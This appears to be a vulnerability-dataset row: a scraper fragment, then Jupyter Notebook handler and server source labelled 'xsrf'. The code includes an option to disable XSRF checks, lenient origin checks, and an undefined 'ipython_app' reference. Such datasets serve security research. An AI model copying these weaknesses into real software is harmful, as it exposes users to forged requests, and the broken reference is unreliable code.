        resp = self.session.get('https://www.kijiji.ca/m-my-ads.html')
        user_id=get_token(resp.text, 'userId')
        my_ads_url = 'https://www.kijiji.ca/j-get-my-ads.json?_=1&currentOffset=0&isPromoting=false&show=ACTIVE&user={}'.format(user_id)
        my_ads_page = self.session.get(my_ads_url)
        my_ads_tree = json.loads(my_ads_page.text)
        ad_ids = [entry['id'] for entry in my_ads_tree['myAdEntries']]
        ad_names = [entry['title'] for entry in my_ads_tree['myAdEntries']]
        return zip(ad_names, ad_ids)
/n/n/n",1,xsrf
4,72,d6f091c4439c174c7700776c0cee03053403f600,"notebook/base/handlers.py/n/n""""""Base Tornado handlers for the notebook server.""""""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

import functools
import json
import os
import re
import sys
import traceback
try:
    # py3
    from http.client import responses
except ImportError:
    from httplib import responses
try:
    from urllib.parse import urlparse # Py 3
except ImportError:
    from urlparse import urlparse # Py 2

from jinja2 import TemplateNotFound
from tornado import web, gen, escape
from tornado.log import app_log

from notebook._sysinfo import get_sys_info

from traitlets.config import Application
from ipython_genutils.path import filefind
from ipython_genutils.py3compat import string_types

import notebook
from notebook.utils import is_hidden, url_path_join, url_is_absolute, url_escape
from notebook.services.security import csp_report_uri

#-----------------------------------------------------------------------------
# Top-level handlers
#-----------------------------------------------------------------------------
non_alphanum = re.compile(r'[^A-Za-z0-9]')

sys_info = json.dumps(get_sys_info())

def log():
    if Application.initialized():
        return Application.instance().log
    else:
        return app_log

class AuthenticatedHandler(web.RequestHandler):
    """"""A RequestHandler with an authenticated user.""""""

    @property
    def content_security_policy(self):
        """"""The default Content-Security-Policy header
        
        Can be overridden by defining Content-Security-Policy in settings['headers']
        """"""
        return '; '.join([
            ""frame-ancestors 'self'"",
            # Make sure the report-uri is relative to the base_url
            ""report-uri "" + url_path_join(self.base_url, csp_report_uri),
        ])

    def set_default_headers(self):
        headers = self.settings.get('headers', {})

        if ""Content-Security-Policy"" not in headers:
            headers[""Content-Security-Policy""] = self.content_security_policy

        # Allow for overriding headers
        for header_name,value in headers.items() :
            try:
                self.set_header(header_name, value)
            except Exception as e:
                # tornado raise Exception (not a subclass)
                # if method is unsupported (websocket and Access-Control-Allow-Origin
                # for example, so just ignore)
                self.log.debug(e)
    
    def clear_login_cookie(self):
        self.clear_cookie(self.cookie_name)
    
    def get_current_user(self):
        if self.login_handler is None:
            return 'anonymous'
        return self.login_handler.get_user(self)

    def skip_check_origin(self):
        """"""Ask my login_handler if I should skip the origin_check
        
        For example: in the default LoginHandler, if a request is token-authenticated,
        origin checking should be skipped.
        """"""
        if self.login_handler is None or not hasattr(self.login_handler, 'should_check_origin'):
            return False
        return not self.login_handler.should_check_origin(self)

    @property
    def token_authenticated(self):
        """"""Have I been authenticated with a token?""""""
        if self.login_handler is None or not hasattr(self.login_handler, 'is_token_authenticated'):
            return False
        return self.login_handler.is_token_authenticated(self)

    @property
    def cookie_name(self):
        default_cookie_name = non_alphanum.sub('-', 'username-{}'.format(
            self.request.host
        ))
        return self.settings.get('cookie_name', default_cookie_name)
    
    @property
    def logged_in(self):
        """"""Is a user currently logged in?""""""
        user = self.get_current_user()
        return (user and not user == 'anonymous')

    @property
    def login_handler(self):
        """"""Return the login handler for this application, if any.""""""
        return self.settings.get('login_handler_class', None)

    @property
    def token(self):
        """"""Return the login token for this application, if any.""""""
        return self.settings.get('token', None)

    @property
    def one_time_token(self):
        """"""Return the one-time-use token for this application, if any.""""""
        return self.settings.get('one_time_token', None)

    @property
    def login_available(self):
        """"""May a user proceed to log in?

        This returns True if login capability is available, irrespective of
        whether the user is already logged in or not.

        """"""
        if self.login_handler is None:
            return False
        return bool(self.login_handler.get_login_available(self.settings))


class IPythonHandler(AuthenticatedHandler):
    """"""IPython-specific extensions to authenticated handling
    
    Mostly property shortcuts to IPython-specific settings.
    """"""

    @property
    def ignore_minified_js(self):
        """"""Wether to user bundle in template. (*.min files)
        
        Mainly use for development and avoid file recompilation
        """"""
        return self.settings.get('ignore_minified_js', False)

    @property
    def config(self):
        return self.settings.get('config', None)
    
    @property
    def log(self):
        """"""use the IPython log by default, falling back on tornado's logger""""""
        return log()

    @property
    def jinja_template_vars(self):
        """"""User-supplied values to supply to jinja templates.""""""
        return self.settings.get('jinja_template_vars', {})
    
    #---------------------------------------------------------------
    # URLs
    #---------------------------------------------------------------
    
    @property
    def version_hash(self):
        """"""The version hash to use for cache hints for static files""""""
        return self.settings.get('version_hash', '')
    
    @property
    def mathjax_url(self):
        url = self.settings.get('mathjax_url', '')
        if not url or url_is_absolute(url):
            return url
        return url_path_join(self.base_url, url)
    
    @property
    def mathjax_config(self):
        return self.settings.get('mathjax_config', 'TeX-AMS-MML_HTMLorMML-full,Safe')

    @property
    def base_url(self):
        return self.settings.get('base_url', '/')

    @property
    def default_url(self):
        return self.settings.get('default_url', '')

    @property
    def ws_url(self):
        return self.settings.get('websocket_url', '')

    @property
    def contents_js_source(self):
        self.log.debug(""Using contents: %s"", self.settings.get('contents_js_source',
            'services/built/contents'))
        return self.settings.get('contents_js_source', 'services/built/contents')
    
    #---------------------------------------------------------------
    # Manager objects
    #---------------------------------------------------------------
    
    @property
    def kernel_manager(self):
        return self.settings['kernel_manager']

    @property
    def contents_manager(self):
        return self.settings['contents_manager']
    
    @property
    def session_manager(self):
        return self.settings['session_manager']
    
    @property
    def terminal_manager(self):
        return self.settings['terminal_manager']
    
    @property
    def kernel_spec_manager(self):
        return self.settings['kernel_spec_manager']

    @property
    def config_manager(self):
        return self.settings['config_manager']

    #---------------------------------------------------------------
    # CORS
    #---------------------------------------------------------------
    
    @property
    def allow_origin(self):
        """"""Normal Access-Control-Allow-Origin""""""
        return self.settings.get('allow_origin', '')
    
    @property
    def allow_origin_pat(self):
        """"""Regular expression version of allow_origin""""""
        return self.settings.get('allow_origin_pat', None)
    
    @property
    def allow_credentials(self):
        """"""Whether to set Access-Control-Allow-Credentials""""""
        return self.settings.get('allow_credentials', False)
    
    def set_default_headers(self):
        """"""Add CORS headers, if defined""""""
        super(IPythonHandler, self).set_default_headers()
        if self.allow_origin:
            self.set_header(""Access-Control-Allow-Origin"", self.allow_origin)
        elif self.allow_origin_pat:
            origin = self.get_origin()
            if origin and self.allow_origin_pat.match(origin):
                self.set_header(""Access-Control-Allow-Origin"", origin)
        if self.allow_credentials:
            self.set_header(""Access-Control-Allow-Credentials"", 'true')
    
    def get_origin(self):
        # Handle WebSocket Origin naming convention differences
        # The difference between version 8 and 13 is that in 8 the
        # client sends a ""Sec-Websocket-Origin"" header and in 13 it's
        # simply ""Origin"".
        if ""Origin"" in self.request.headers:
            origin = self.request.headers.get(""Origin"")
        else:
            origin = self.request.headers.get(""Sec-Websocket-Origin"", None)
        return origin

    # origin_to_satisfy_tornado is present because tornado requires
    # check_origin to take an origin argument, but we don't use it
    def check_origin(self, origin_to_satisfy_tornado=""""):
        """"""Check Origin for cross-site API requests, including websockets

        Copied from WebSocket with changes:

        - allow unspecified host/origin (e.g. scripts)
        - allow token-authenticated requests
        """"""
        if self.allow_origin == '*' or self.skip_check_origin():
            return True

        host = self.request.headers.get(""Host"")
        origin = self.request.headers.get(""Origin"")

        # If no header is provided, allow it.
        # Origin can be None for:
        # - same-origin (IE, Firefox)
        # - Cross-site POST form (IE, Firefox)
        # - Scripts
        # The cross-site POST (XSRF) case is handled by tornado's xsrf_token
        if origin is None or host is None:
            return True

        origin = origin.lower()
        origin_host = urlparse(origin).netloc

        # OK if origin matches host
        if origin_host == host:
            return True

        # Check CORS headers
        if self.allow_origin:
            allow = self.allow_origin == origin
        elif self.allow_origin_pat:
            allow = bool(self.allow_origin_pat.match(origin))
        else:
            # No CORS headers deny the request
            allow = False
        if not allow:
            self.log.warning(""Blocking Cross Origin API request for %s.  Origin: %s, Host: %s"",
                self.request.path, origin, host,
            )
        return allow

    def check_xsrf_cookie(self):
        """"""Bypass xsrf checks when token-authenticated""""""
        if self.token_authenticated or self.settings.get('disable_check_xsrf', False):
            # Token-authenticated requests do not need additional XSRF-check
            # Servers without authentication are vulnerable to XSRF
            return
        return super(IPythonHandler, self).check_xsrf_cookie()

    #---------------------------------------------------------------
    # template rendering
    #---------------------------------------------------------------
    
    def get_template(self, name):
        """"""Return the jinja template object for a given name""""""
        return self.settings['jinja2_env'].get_template(name)
    
    def render_template(self, name, **ns):
        ns.update(self.template_namespace)
        template = self.get_template(name)
        return template.render(**ns)
    
    @property
    def template_namespace(self):
        return dict(
            base_url=self.base_url,
            default_url=self.default_url,
            ws_url=self.ws_url,
            logged_in=self.logged_in,
            login_available=self.login_available,
            token_available=bool(self.token or self.one_time_token),
            static_url=self.static_url,
            sys_info=sys_info,
            contents_js_source=self.contents_js_source,
            version_hash=self.version_hash,
            ignore_minified_js=self.ignore_minified_js,
            xsrf_form_html=self.xsrf_form_html,
            token=self.token,
            xsrf_token=self.xsrf_token.decode('utf8'),
            **self.jinja_template_vars
        )
    
    def get_json_body(self):
        """"""Return the body of the request as JSON data.""""""
        if not self.request.body:
            return None
        # Do we need to call body.decode('utf-8') here?
        body = self.request.body.strip().decode(u'utf-8')
        try:
            model = json.loads(body)
        except Exception:
            self.log.debug(""Bad JSON: %r"", body)
            self.log.error(""Couldn't parse JSON"", exc_info=True)
            raise web.HTTPError(400, u'Invalid JSON in body of request')
        return model

    def write_error(self, status_code, **kwargs):
        """"""render custom error pages""""""
        exc_info = kwargs.get('exc_info')
        message = ''
        status_message = responses.get(status_code, 'Unknown HTTP Error')
        exception = '(unknown)'
        if exc_info:
            exception = exc_info[1]
            # get the custom message, if defined
            try:
                message = exception.log_message % exception.args
            except Exception:
                pass
            
            # construct the custom reason, if defined
            reason = getattr(exception, 'reason', '')
            if reason:
                status_message = reason
        
        # build template namespace
        ns = dict(
            status_code=status_code,
            status_message=status_message,
            message=message,
            exception=exception,
        )
        
        self.set_header('Content-Type', 'text/html')
        # render the template
        try:
            html = self.render_template('%s.html' % status_code, **ns)
        except TemplateNotFound:
            self.log.debug(""No template for %d"", status_code)
            html = self.render_template('error.html', **ns)
        
        self.write(html)


class APIHandler(IPythonHandler):
    """"""Base class for API handlers""""""

    def prepare(self):
        if not self.check_origin():
            raise web.HTTPError(404)
        return super(APIHandler, self).prepare()

    @property
    def content_security_policy(self):
        csp = '; '.join([
                super(APIHandler, self).content_security_policy,
                ""default-src 'none'"",
            ])
        return csp
    
    def finish(self, *args, **kwargs):
        self.set_header('Content-Type', 'application/json')
        return super(APIHandler, self).finish(*args, **kwargs)

    def options(self, *args, **kwargs):
        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')
        self.set_header('Access-Control-Allow-Methods',
                        'GET, PUT, POST, PATCH, DELETE, OPTIONS')
        self.finish()


class Template404(IPythonHandler):
    """"""Render our 404 template""""""
    def prepare(self):
        raise web.HTTPError(404)


class AuthenticatedFileHandler(IPythonHandler, web.StaticFileHandler):
    """"""static files should only be accessible when logged in""""""

    @web.authenticated
    def get(self, path):
        if os.path.splitext(path)[1] == '.ipynb':
            name = path.rsplit('/', 1)[-1]
            self.set_header('Content-Type', 'application/json')
            self.set_header('Content-Disposition','attachment; filename=""%s""' % escape.url_escape(name))
        
        return web.StaticFileHandler.get(self, path)
    
    def set_headers(self):
        super(AuthenticatedFileHandler, self).set_headers()
        # disable browser caching, rely on 304 replies for savings
        if ""v"" not in self.request.arguments:
            self.add_header(""Cache-Control"", ""no-cache"")
    
    def compute_etag(self):
        return None
    
    def validate_absolute_path(self, root, absolute_path):
        """"""Validate and return the absolute path.
        
        Requires tornado 3.1
        
        Adding to tornado's own handling, forbids the serving of hidden files.
        """"""
        abs_path = super(AuthenticatedFileHandler, self).validate_absolute_path(root, absolute_path)
        abs_root = os.path.abspath(root)
        if is_hidden(abs_path, abs_root):
            self.log.info(""Refusing to serve hidden file, via 404 Error"")
            raise web.HTTPError(404)
        return abs_path


def json_errors(method):
    """"""Decorate methods with this to return GitHub style JSON errors.
    
    This should be used on any JSON API on any handler method that can raise HTTPErrors.
    
    This will grab the latest HTTPError exception using sys.exc_info
    and then:
    
    1. Set the HTTP status code based on the HTTPError
    2. Create and return a JSON body with a message field describing
       the error in a human readable form.
    """"""
    @functools.wraps(method)
    @gen.coroutine
    def wrapper(self, *args, **kwargs):
        try:
            result = yield gen.maybe_future(method(self, *args, **kwargs))
        except web.HTTPError as e:
            self.set_header('Content-Type', 'application/json')
            status = e.status_code
            message = e.log_message
            self.log.warning(message)
            self.set_status(e.status_code)
            reply = dict(message=message, reason=e.reason)
            self.finish(json.dumps(reply))
        except Exception:
            self.set_header('Content-Type', 'application/json')
            self.log.error(""Unhandled error in API request"", exc_info=True)
            status = 500
            message = ""Unknown server error""
            t, value, tb = sys.exc_info()
            self.set_status(status)
            tb_text = ''.join(traceback.format_exception(t, value, tb))
            reply = dict(message=message, reason=None, traceback=tb_text)
            self.finish(json.dumps(reply))
        else:
            # FIXME: can use regular return in generators in py3
            raise gen.Return(result)
    return wrapper



#-----------------------------------------------------------------------------
# File handler
#-----------------------------------------------------------------------------

# to minimize subclass changes:
HTTPError = web.HTTPError

class FileFindHandler(IPythonHandler, web.StaticFileHandler):
    """"""subclass of StaticFileHandler for serving files from a search path""""""
    
    # cache search results, don't search for files more than once
    _static_paths = {}
    
    def set_headers(self):
        super(FileFindHandler, self).set_headers()
        # disable browser caching, rely on 304 replies for savings
        if ""v"" not in self.request.arguments or \
                any(self.request.path.startswith(path) for path in self.no_cache_paths):
            self.set_header(""Cache-Control"", ""no-cache"")
    
    def initialize(self, path, default_filename=None, no_cache_paths=None):
        self.no_cache_paths = no_cache_paths or []
        
        if isinstance(path, string_types):
            path = [path]
        
        self.root = tuple(
            os.path.abspath(os.path.expanduser(p)) + os.sep for p in path
        )
        self.default_filename = default_filename
    
    def compute_etag(self):
        return None
    
    @classmethod
    def get_absolute_path(cls, roots, path):
        """"""locate a file to serve on our static file search path""""""
        with cls._lock:
            if path in cls._static_paths:
                return cls._static_paths[path]
            try:
                abspath = os.path.abspath(filefind(path, roots))
            except IOError:
                # IOError means not found
                return ''
            
            cls._static_paths[path] = abspath
            

            log().debug(""Path %s served from %s""%(path, abspath))
            return abspath
    
    def validate_absolute_path(self, root, absolute_path):
        """"""check if the file should be served (raises 404, 403, etc.)""""""
        if absolute_path == '':
            raise web.HTTPError(404)
        
        for root in self.root:
            if (absolute_path + os.sep).startswith(root):
                break
        
        return super(FileFindHandler, self).validate_absolute_path(root, absolute_path)


class APIVersionHandler(APIHandler):

    @json_errors
    def get(self):
        # not authenticated, so give as few info as possible
        self.finish(json.dumps({""version"":notebook.__version__}))


class TrailingSlashHandler(web.RequestHandler):
    """"""Simple redirect handler that strips trailing slashes
    
    This should be the first, highest priority handler.
    """"""
    
    def get(self):
        self.redirect(self.request.uri.rstrip('/'))
    
    post = put = get


class FilesRedirectHandler(IPythonHandler):
    """"""Handler for redirecting relative URLs to the /files/ handler""""""
    
    @staticmethod
    def redirect_to_files(self, path):
        """"""make redirect logic a reusable static method
        
        so it can be called from other handlers.
        """"""
        cm = self.contents_manager
        if cm.dir_exists(path):
            # it's a *directory*, redirect to /tree
            url = url_path_join(self.base_url, 'tree', url_escape(path))
        else:
            orig_path = path
            # otherwise, redirect to /files
            parts = path.split('/')

            if not cm.file_exists(path=path) and 'files' in parts:
                # redirect without files/ iff it would 404
                # this preserves pre-2.0-style 'files/' links
                self.log.warning(""Deprecated files/ URL: %s"", orig_path)
                parts.remove('files')
                path = '/'.join(parts)

            if not cm.file_exists(path=path):
                raise web.HTTPError(404)

            url = url_path_join(self.base_url, 'files', url_escape(path))
        self.log.debug(""Redirecting %s to %s"", self.request.path, url)
        self.redirect(url)
    
    def get(self, path=''):
        return self.redirect_to_files(self, path)


class RedirectWithParams(web.RequestHandler):
    """"""Sam as web.RedirectHandler, but preserves URL parameters""""""
    def initialize(self, url, permanent=True):
        self._url = url
        self._permanent = permanent

    def get(self):
        sep = '&' if '?' in self._url else '?'
        url = sep.join([self._url, self.request.query])
        self.redirect(url, permanent=self._permanent)

#-----------------------------------------------------------------------------
# URL pattern fragments for re-use
#-----------------------------------------------------------------------------

# path matches any number of `/foo[/bar...]` or just `/` or ''
path_regex = r""(?P<path>(?:(?:/[^/]+)+|/?))""

#-----------------------------------------------------------------------------
# URL to handler mappings
#-----------------------------------------------------------------------------


default_handlers = [
    (r"".*/"", TrailingSlashHandler),
    (r""api"", APIVersionHandler)
]
/n/n/nnotebook/notebookapp.py/n/n# coding: utf-8
""""""A tornado based Jupyter notebook server.""""""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from __future__ import absolute_import, print_function

import binascii
import datetime
import errno
import importlib
import io
import json
import logging
import mimetypes
import os
import random
import re
import select
import signal
import socket
import sys
import threading
import warnings
import webbrowser

try: #PY3
    from base64 import encodebytes
except ImportError: #PY2
    from base64 import encodestring as encodebytes


from jinja2 import Environment, FileSystemLoader

# Install the pyzmq ioloop. This has to be done before anything else from
# tornado is imported.
from zmq.eventloop import ioloop
ioloop.install()

# check for tornado 3.1.0
msg = ""The Jupyter Notebook requires tornado >= 4.0""
try:
    import tornado
except ImportError:
    raise ImportError(msg)
try:
    version_info = tornado.version_info
except AttributeError:
    raise ImportError(msg + "", but you have < 1.1.0"")
if version_info < (4,0):
    raise ImportError(msg + "", but you have %s"" % tornado.version)

from tornado import httpserver
from tornado import web
from tornado.httputil import url_concat
from tornado.log import LogFormatter, app_log, access_log, gen_log

from notebook import (
    DEFAULT_STATIC_FILES_PATH,
    DEFAULT_TEMPLATE_PATH_LIST,
    __version__,
)

# py23 compatibility
try:
    raw_input = raw_input
except NameError:
    raw_input = input

from .base.handlers import Template404, RedirectWithParams
from .log import log_request
from .services.kernels.kernelmanager import MappingKernelManager
from .services.config import ConfigManager
from .services.contents.manager import ContentsManager
from .services.contents.filemanager import FileContentsManager
from .services.sessions.sessionmanager import SessionManager

from .auth.login import LoginHandler
from .auth.logout import LogoutHandler
from .base.handlers import FileFindHandler

from traitlets.config import Config
from traitlets.config.application import catch_config_error, boolean_flag
from jupyter_core.application import (
    JupyterApp, base_flags, base_aliases,
)
from jupyter_client import KernelManager
from jupyter_client.kernelspec import KernelSpecManager, NoSuchKernel, NATIVE_KERNEL_NAME
from jupyter_client.session import Session
from nbformat.sign import NotebookNotary
from traitlets import (
    Dict, Unicode, Integer, List, Bool, Bytes, Instance,
    TraitError, Type, Float, observe, default, validate
)
from ipython_genutils import py3compat
from jupyter_core.paths import jupyter_runtime_dir, jupyter_path
from notebook._sysinfo import get_sys_info

from .utils import url_path_join, check_pid, url_escape

#-----------------------------------------------------------------------------
# Module globals
#-----------------------------------------------------------------------------

_examples = """"""
jupyter notebook                       # start the notebook
jupyter notebook --certfile=mycert.pem # use SSL/TLS certificate
""""""

DEV_NOTE_NPM = """"""It looks like you're running the notebook from source.
If you're working on the Javascript of the notebook, try running

    npm run build:watch

in another terminal window to have the system incrementally
watch and build the notebook's JavaScript for you, as you make changes.
""""""

#-----------------------------------------------------------------------------
# Helper functions
#-----------------------------------------------------------------------------

def random_ports(port, n):
    """"""Generate a list of n random ports near the given port.

    The first 5 ports will be sequential, and the remaining n-5 will be
    randomly selected in the range [port-2*n, port+2*n].
    """"""
    for i in range(min(5, n)):
        yield port + i
    for i in range(n-5):
        yield max(1, port + random.randint(-2*n, 2*n))

def load_handlers(name):
    """"""Load the (URL pattern, handler) tuples for each component.""""""
    name = 'notebook.' + name
    mod = __import__(name, fromlist=['default_handlers'])
    return mod.default_handlers

#-----------------------------------------------------------------------------
# The Tornado web application
#-----------------------------------------------------------------------------

class NotebookWebApplication(web.Application):

    def __init__(self, jupyter_app, kernel_manager, contents_manager,
                 session_manager, kernel_spec_manager,
                 config_manager, log,
                 base_url, default_url, settings_overrides, jinja_env_options):

        # If the user is running the notebook in a git directory, make the assumption
        # that this is a dev install and suggest to the developer `npm run build:watch`.
        base_dir = os.path.realpath(os.path.join(__file__, '..', '..'))
        dev_mode = os.path.exists(os.path.join(base_dir, '.git'))
        if dev_mode:
            log.info(DEV_NOTE_NPM)

        settings = self.init_settings(
            jupyter_app, kernel_manager, contents_manager,
            session_manager, kernel_spec_manager, config_manager, log, base_url,
            default_url, settings_overrides, jinja_env_options)
        handlers = self.init_handlers(settings)

        super(NotebookWebApplication, self).__init__(handlers, **settings)

    def init_settings(self, jupyter_app, kernel_manager, contents_manager,
                      session_manager, kernel_spec_manager,
                      config_manager,
                      log, base_url, default_url, settings_overrides,
                      jinja_env_options=None):

        _template_path = settings_overrides.get(
            ""template_path"",
            jupyter_app.template_file_path,
        )
        if isinstance(_template_path, py3compat.string_types):
            _template_path = (_template_path,)
        template_path = [os.path.expanduser(path) for path in _template_path]

        jenv_opt = {""autoescape"": True}
        jenv_opt.update(jinja_env_options if jinja_env_options else {})

        env = Environment(loader=FileSystemLoader(template_path), **jenv_opt)
        
        sys_info = get_sys_info()
        if sys_info['commit_source'] == 'repository':
            # don't cache (rely on 304) when working from master
            version_hash = ''
        else:
            # reset the cache on server restart
            version_hash = datetime.datetime.now().strftime(""%Y%m%d%H%M%S"")

        if jupyter_app.ignore_minified_js:
            log.warning(""""""The `ignore_minified_js` flag is deprecated and no 
                longer works.  Alternatively use `npm run build:watch` when
                working on the notebook's Javascript and LESS"""""")
            warnings.warn(""The `ignore_minified_js` flag is deprecated and will be removed in Notebook 6.0"", DeprecationWarning)

        settings = dict(
            # basics
            log_function=log_request,
            base_url=base_url,
            default_url=default_url,
            template_path=template_path,
            static_path=jupyter_app.static_file_path,
            static_custom_path=jupyter_app.static_custom_path,
            static_handler_class = FileFindHandler,
            static_url_prefix = url_path_join(base_url,'/static/'),
            static_handler_args = {
                # don't cache custom.js
                'no_cache_paths': [url_path_join(base_url, 'static', 'custom')],
            },
            version_hash=version_hash,
            ignore_minified_js=jupyter_app.ignore_minified_js,
            
            # rate limits
            iopub_msg_rate_limit=jupyter_app.iopub_msg_rate_limit,
            iopub_data_rate_limit=jupyter_app.iopub_data_rate_limit,
            rate_limit_window=jupyter_app.rate_limit_window,
            
            # authentication
            cookie_secret=jupyter_app.cookie_secret,
            login_url=url_path_join(base_url,'/login'),
            login_handler_class=jupyter_app.login_handler_class,
            logout_handler_class=jupyter_app.logout_handler_class,
            password=jupyter_app.password,
            xsrf_cookies=True,
            disable_check_xsrf=ipython_app.disable_check_xsrf,

            # managers
            kernel_manager=kernel_manager,
            contents_manager=contents_manager,
            session_manager=session_manager,
            kernel_spec_manager=kernel_spec_manager,
            config_manager=config_manager,

            # IPython stuff
            jinja_template_vars=jupyter_app.jinja_template_vars,
            nbextensions_path=jupyter_app.nbextensions_path,
            websocket_url=jupyter_app.websocket_url,
            mathjax_url=jupyter_app.mathjax_url,
            mathjax_config=jupyter_app.mathjax_config,
            config=jupyter_app.config,
            config_dir=jupyter_app.config_dir,
            jinja2_env=env,
            terminals_available=False,  # Set later if terminals are available
        )

        # allow custom overrides for the tornado web app.
        settings.update(settings_overrides)
        return settings

    def init_handlers(self, settings):
        """"""Load the (URL pattern, handler) tuples for each component.""""""
        
        # Order matters. The first handler to match the URL will handle the request.
        handlers = []
        handlers.extend(load_handlers('tree.handlers'))
        handlers.extend([(r""/login"", settings['login_handler_class'])])
        handlers.extend([(r""/logout"", settings['logout_handler_class'])])
        handlers.extend(load_handlers('files.handlers'))
        handlers.extend(load_handlers('notebook.handlers'))
        handlers.extend(load_handlers('nbconvert.handlers'))
        handlers.extend(load_handlers('bundler.handlers'))
        handlers.extend(load_handlers('kernelspecs.handlers'))
        handlers.extend(load_handlers('edit.handlers'))
        handlers.extend(load_handlers('services.api.handlers'))
        handlers.extend(load_handlers('services.config.handlers'))
        handlers.extend(load_handlers('services.kernels.handlers'))
        handlers.extend(load_handlers('services.contents.handlers'))
        handlers.extend(load_handlers('services.sessions.handlers'))
        handlers.extend(load_handlers('services.nbconvert.handlers'))
        handlers.extend(load_handlers('services.kernelspecs.handlers'))
        handlers.extend(load_handlers('services.security.handlers'))
        
        # BEGIN HARDCODED WIDGETS HACK
        # TODO: Remove on notebook 5.0
        widgets = None
        try:
            import widgetsnbextension
        except:
            try:
                import ipywidgets as widgets
                handlers.append(
                    (r""/nbextensions/widgets/(.*)"", FileFindHandler, {
                        'path': widgets.find_static_assets(),
                        'no_cache_paths': ['/'], # don't cache anything in nbextensions
                    }),
                )
            except:
                app_log.warning('Widgets are unavailable. Please install widgetsnbextension or ipywidgets 4.0')
        # END HARDCODED WIDGETS HACK
        
        handlers.append(
            (r""/nbextensions/(.*)"", FileFindHandler, {
                'path': settings['nbextensions_path'],
                'no_cache_paths': ['/'], # don't cache anything in nbextensions
            }),
        )
        handlers.append(
            (r""/custom/(.*)"", FileFindHandler, {
                'path': settings['static_custom_path'],
                'no_cache_paths': ['/'], # don't cache anything in custom
            })
        )
        # register base handlers last
        handlers.extend(load_handlers('base.handlers'))
        # set the URL that will be redirected from `/`
        handlers.append(
            (r'/?', RedirectWithParams, {
                'url' : settings['default_url'],
                'permanent': False, # want 302, not 301
            })
        )

        # prepend base_url onto the patterns that we match
        new_handlers = []
        for handler in handlers:
            pattern = url_path_join(settings['base_url'], handler[0])
            new_handler = tuple([pattern] + list(handler[1:]))
            new_handlers.append(new_handler)
        # add 404 on the end, which will catch everything that falls through
        new_handlers.append((r'(.*)', Template404))
        return new_handlers


class NbserverListApp(JupyterApp):
    version = __version__
    description=""List currently running notebook servers.""
    
    flags = dict(
        json=({'NbserverListApp': {'json': True}},
              ""Produce machine-readable JSON output.""),
    )
    
    json = Bool(False, config=True,
          help=""If True, each line of output will be a JSON object with the ""
                  ""details from the server info file."")

    def start(self):
        if not self.json:
            print(""Currently running servers:"")
        for serverinfo in list_running_servers(self.runtime_dir):
            if self.json:
                print(json.dumps(serverinfo))
            else:
                url = serverinfo['url']
                if serverinfo.get('token'):
                    url = url + '?token=%s' % serverinfo['token']
                print(url, ""::"", serverinfo['notebook_dir'])

#-----------------------------------------------------------------------------
# Aliases and Flags
#-----------------------------------------------------------------------------

flags = dict(base_flags)
flags['no-browser']=(
    {'NotebookApp' : {'open_browser' : False}},
    ""Don't open the notebook in a browser after startup.""
)
flags['pylab']=(
    {'NotebookApp' : {'pylab' : 'warn'}},
    ""DISABLED: use %pylab or %matplotlib in the notebook to enable matplotlib.""
)
flags['no-mathjax']=(
    {'NotebookApp' : {'enable_mathjax' : False}},
    """"""Disable MathJax
    
    MathJax is the javascript library Jupyter uses to render math/LaTeX. It is
    very large, so you may want to disable it if you have a slow internet
    connection, or for offline use of the notebook.
    
    When disabled, equations etc. will appear as their untransformed TeX source.
    """"""
)

flags['allow-root']=(
    {'NotebookApp' : {'allow_root' : True}},
    ""Allow the notebook to be run from root user.""
)

# Add notebook manager flags
flags.update(boolean_flag('script', 'FileContentsManager.save_script',
               'DEPRECATED, IGNORED',
               'DEPRECATED, IGNORED'))

aliases = dict(base_aliases)

aliases.update({
    'ip': 'NotebookApp.ip',
    'port': 'NotebookApp.port',
    'port-retries': 'NotebookApp.port_retries',
    'transport': 'KernelManager.transport',
    'keyfile': 'NotebookApp.keyfile',
    'certfile': 'NotebookApp.certfile',
    'client-ca': 'NotebookApp.client_ca',
    'notebook-dir': 'NotebookApp.notebook_dir',
    'browser': 'NotebookApp.browser',
    'pylab': 'NotebookApp.pylab',
})

#-----------------------------------------------------------------------------
# NotebookApp
#-----------------------------------------------------------------------------

class NotebookApp(JupyterApp):

    name = 'jupyter-notebook'
    version = __version__
    description = """"""
        The Jupyter HTML Notebook.
        
        This launches a Tornado based HTML Notebook Server that serves up an
        HTML5/Javascript Notebook client.
    """"""
    examples = _examples
    aliases = aliases
    flags = flags
    
    classes = [
        KernelManager, Session, MappingKernelManager,
        ContentsManager, FileContentsManager, NotebookNotary,
        KernelSpecManager,
    ]
    flags = Dict(flags)
    aliases = Dict(aliases)
    
    subcommands = dict(
        list=(NbserverListApp, NbserverListApp.description.splitlines()[0]),
    )

    _log_formatter_cls = LogFormatter

    @default('log_level')
    def _default_log_level(self):
        return logging.INFO

    @default('log_datefmt')
    def _default_log_datefmt(self):
        """"""Exclude date from default date format""""""
        return ""%H:%M:%S""
    
    @default('log_format')
    def _default_log_format(self):
        """"""override default log format to include time""""""
        return u""%(color)s[%(levelname)1.1s %(asctime)s.%(msecs).03d %(name)s]%(end_color)s %(message)s""

    ignore_minified_js = Bool(False,
            config=True,
            help='Deprecated: Use minified JS file or not, mainly use during dev to avoid JS recompilation', 
            )

    # file to be opened in the notebook server
    file_to_run = Unicode('', config=True)

    # Network related information
    
    allow_origin = Unicode('', config=True,
        help=""""""Set the Access-Control-Allow-Origin header
        
        Use '*' to allow any origin to access your server.
        
        Takes precedence over allow_origin_pat.
        """"""
    )
    
    allow_origin_pat = Unicode('', config=True,
        help=""""""Use a regular expression for the Access-Control-Allow-Origin header
        
        Requests from an origin matching the expression will get replies with:
        
            Access-Control-Allow-Origin: origin
        
        where `origin` is the origin of the request.
        
        Ignored if allow_origin is set.
        """"""
    )
    
    allow_credentials = Bool(False, config=True,
        help=""Set the Access-Control-Allow-Credentials: true header""
    )
    
    allow_root = Bool(False, config=True, 
        help=""Whether to allow the user to run the notebook as root.""
    )

    default_url = Unicode('/tree', config=True,
        help=""The default URL to redirect to from `/`""
    )
    
    ip = Unicode('localhost', config=True,
        help=""The IP address the notebook server will listen on.""
    )

    @default('ip')
    def _default_ip(self):
        """"""Return localhost if available, 127.0.0.1 otherwise.
        
        On some (horribly broken) systems, localhost cannot be bound.
        """"""
        s = socket.socket()
        try:
            s.bind(('localhost', 0))
        except socket.error as e:
            self.log.warning(""Cannot bind to localhost, using 127.0.0.1 as default ip\n%s"", e)
            return '127.0.0.1'
        else:
            s.close()
